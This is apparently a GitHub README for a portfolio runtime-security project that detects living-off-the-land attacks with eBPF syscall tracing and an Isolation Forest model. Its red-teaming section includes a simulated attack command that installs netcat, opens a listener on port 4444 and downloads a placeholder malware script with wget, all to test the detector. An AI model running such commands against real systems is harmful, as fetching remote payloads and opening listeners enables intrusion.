# SecureSME - Cloud-Native Runtime Security Engine

![Build Status](https://github.com/Murashidzi/SecureSME-Platform/actions/workflows/security-scan.yml/badge.svg)
![Python](https://img.shields.io/badge/Python-3.12-blue)
![Architecture](https://img.shields.io/badge/Architecture-Distributed%20Microservices-orange)
![eBPF](https://img.shields.io/badge/Kernel-eBPF_Observability-red)
![ML](https://img.shields.io/badge/AI-Isolation_Forest-purple)

## Portfolio Evidence
### 1. eBPF Kernel-Level Threat Detection
*Privileged agent hooking `sys_execve` to detect "Living off the Land" attacks in real-time.*
![eBPF Detection](assets/images/ebpf_detection.png)

### 2. Distributed Alerting System
*Asynchronous processing of heavy log files using Redis & Celery worker nodes.*

---

## Architecture: Dual-Sensor Defense

SecureSME utilizes a hybrid detection strategy, combining asynchronous log parsing (User Space) for legacy forensic analysis with AI-driven system call tracing (Kernel Space) for zero-day threat prevention.

```mermaid
graph TD
    %% Legacy Log Pipeline
    subgraph Reactive Sensor (User Space)
        User["Forensic Analyst"] -->|"Upload auth.log"| API["Flask API Gateway"]
        API -->|"Queue Task"| Redis["Redis Message Broker"]
        Redis -->|"Pop Task"| Worker["Celery Worker Node"]
        Worker -->|"Regex Threat Parsing"| DB[("PostgreSQL")]
    end

    %% Modern eBPF Pipeline
    subgraph Proactive Sensor (Kernel Space)
        Attacker["Attacker (Compromised Pod)"] -->|"Runs malware"| Syscall["sys_execve (Ring 0)"]
        Syscall -->|"Intercept"| BPF["eBPF Probe"]
        BPF -->|"Perf Buffer"| Agent["Python Security Agent"]
        Agent -->|"Feature Extraction"| ML["Isolation Forest (AI)"]
        ML -->|"-1 (Anomaly Detected)"| API
    end

    %% Frontend
    DB -->|"Fetch Telemetry"| UI["React PWA Dashboard"
```

## Key Features

* **Kernel Observability (eBPF):** A privileged Docker container running an eBPF probe that hooks into the Linux kernel to gain immutable, Ring-0 visibility across all workloads.

* **AI Anomaly Detection:** Replaces rigid regex rules with an Unsupervised Machine Learning model (Isolation Forest) deployed at the edge to mathematically detect zero-day reverse shells and droppers.

* **Automated Threat Intelligence:** Parses unstructured server logs (syslog, auth.log) to identify high-severity incidents like SSH brute force and Root access attempts.

* **Adversarial Validation:** Architecture successfully red-teamed against simulated container-escape and living-off-the-land (LotL) attack chains.

* **DevSecOps Pipeline:** Integrated Bandit (SAST) and Safety dependency scanning into GitHub Actions to block vulnerable code.


## Tech Stack

* **Kernel Observability:** eBPF (BCC Library), C, Python
* **Machine Learning:** Scikit-Learn, Pandas, Joblib
* **Core Backend:** Python 3.12, Flask, SQLAlchemy
* **Async Infrastructure:** Celery, Redis
* **Frontend:** React, TailwindCSS
* **Database:** PostgreSQL
* **DevOps:** Docker, Docker Compose, GitHub Actions

##  Installation & Setup

1.  **Clone the repository**
    ```bash
    git clone https://github.com/Murashidzi/SecureSME-Platform.git
    cd SecureSME-Platform
    ```

2.  **Start with Docker:** (Note: The eBPF agent requires host kernel headers and privileged execution)
    ```bash
    sudo docker-compose up -d --build
    ```
3. **Initialize Database**
    ```sudo docker exec securesme_api python init_db.py```


##  Adversarial Testing (Red Teaming)
* **Test A: The Reactive Engine (Log Analysis)**
1. **Trigger a forensic log upload via the API:**
   ```bash
    curl -X POST -F "file=@heavy_attack.log" http://localhost:5000/api/upload
    ```
2. **Verify asynchronous background processing::**
    ```bash
    sudo docker logs -f securesme_worker
    ```
**Test B: The Proactive Engine (AI Kernel Probe): Simulate an attacker inside an isolated container executing a malicious payload:**

1. **Monitor the Flask API ingestion:**
    ```bash
    sudo docker logs -f securesme_api
    ```
2. **Launch the attack from a new terminal:**
    ```bash
    sudo docker run --rm alpine sh -c "apk add --no-cache netcat-openbsd && nc -lvp 4444 & wget [http://example.com/malware.sh](http://example.com/malware.sh)"
    ```
---
*Engineered by Murashidzi as a demonstration of DevSecOps and Software Engineering principles.*
